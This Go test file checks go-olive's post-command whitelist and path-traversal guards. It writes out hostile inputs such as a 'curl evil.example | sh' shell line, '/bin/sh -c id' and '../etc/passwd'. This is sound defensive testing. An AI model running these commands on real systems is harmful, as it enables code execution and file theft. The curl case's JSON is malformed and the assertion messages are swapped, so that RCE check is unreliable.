package validate_test

import (
	"strings"
	"testing"

	"github.com/go-olive/olive/business/sys/validate"
)

// TestCheckPostCmds_Whitelist asserts the historical "any path becomes a
// binary to execute" RCE is closed: every supported task type passes, every
// unknown path is rejected at validation time before any uploader dispatch.
func TestCheckPostCmds_Whitelist(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantOK  bool
	}{
		{"empty", "", true},
		{"empty list", "[]", true},
		{"olivetrash", `[{"path":"olivetrash"}]`, true},
		{"olivearchive", `[{"path":"olivearchive"}]`, true},
		{"olivebiliup", `[{"path":"olivebiliup"}]`, true},
		{"oliveshell with args", `[{"path":"oliveshell","args":["/bin/echo","hi"]}]`, true},
		{"arbitrary binary rce attempt", `[{"path":"/bin/sh","args":["-c","curl evil.example | sh"}]`, false},
		{"binary missing leading slash", `[{"path":"local-script.sh"}]`, false},
		{"oliveshell without args", `[{"path":"oliveshell"}]`, false},
		{"malformed json", `[not-json`, false},
	}
	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			err := validate.CheckPostCmds(c.input)
			if c.wantOK && err != nil {
				t.Fatalf("CheckPostCmds accepted %q unexpectedly: %v", c.input, err)
			}
			if !c.wantOK && err == nil {
				t.Fatalf("CheckPostCmds rejected %q unexpectedly: %v", c.input, err)
			}
		})
	}
}

// TestToExecCmds_PreservesWhitelistedPath verifies that the helper used by
// the engine translates only whitelisted paths to []*exec.Cmd. The returned
// Cmd.Path holds the task-type identifier (not a binary path), so the
// uploader can dispatch only to its registered handlers.
func TestToExecCmds_PreservesWhitelistedPath(t *testing.T) {
	cmds, err := validate.ToExecCmds(`[{"path":"oliveshell","args":["/bin/echo","hi"]}]`)
	if err != nil {
		t.Fatalf("ToExecCmds: %v", err)
	}
	if len(cmds) != 1 {
		t.Fatalf("got %d cmds, want 1", len(cmds))
	}
	if cmds[0].Path != "oliveshell" {
		t.Fatalf("Path = %q, want %q", cmds[0].Path, "oliveshell")
	}
	if len(cmds[0].Args) != 2 || cmds[0].Args[0] != "/bin/echo" {
		t.Fatalf("Args = %v, want [/bin/echo hi]", cmds[0].Args)
	}
}

// TestCheckPostCmds_RejectsUnknownError confirms the rejection error carries a
// human-readable hint enumerating the allowed task types. This is what an
// operator/admin should see in the API response when an attacker tries to
// smuggle an arbitrary binary path.
func TestCheckPostCmds_RejectsUnknownError(t *testing.T) {
	err := validate.CheckPostCmds(`[{"path":"/bin/sh","args":["-c","id"]}]`)
	if err == nil {
		t.Fatal("expected rejection of /bin/sh as a post cmd path")
	}
	if !strings.Contains(err.Error(), "oliveshell") ||
		!strings.Contains(err.Error(), "olivetrash") {
		t.Fatalf("rejection error lacks whitelist hint: %v", err)
	}
}

// TestCheckSafePath expands the path-traversal guards used to keep SaveDir /
// OutTmpl from breaking out of the configured recording directory.
func TestCheckSafePath(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"", true},                            // empty (engine falls back to default)
		{"recordings/foo", true},              // relative nesting allowed
		{"{{ .StreamerName }}/clips", true},    // template syntax stays relative
		{"..", false},                         // outright traversal
		{"../etc/passwd", false},              // traversal with file
		{"foo/../bar/../..", false},           // traversal after nesting
		{"/etc/cron.d/x", false},              // absolute path rejected
		{"\\windows\\system32", false},        // leading backslash is an absolute path on Windows
		{"foo\x00bar", false},                 // NUL byte rejected
	}
	for _, c := range cases {
		c := c
		t.Run(c.path, func(t *testing.T) {
			err := validate.CheckSafePath(c.path)
			got := err == nil
			if got != c.want {
				t.Fatalf("CheckSafePath(%q) = ok=%v, want %v (err=%v)", c.path, got, c.want, err)
			}
		})
	}
}

// TestCheckSafeFilename is the stricter sibling that also rejects path
// separators entirely.
func TestCheckSafeFilename(t *testing.T) {
	if err := validate.CheckSafeFilename("{{ .StreamerName }}.flv"); err != nil {
		t.Fatalf("reasonable filename rejected: %v", err)
	}
	if err := validate.CheckSafeFilename("sub/file.flv"); err == nil {
		t.Fatal("filename containing path separator accepted")
	}
}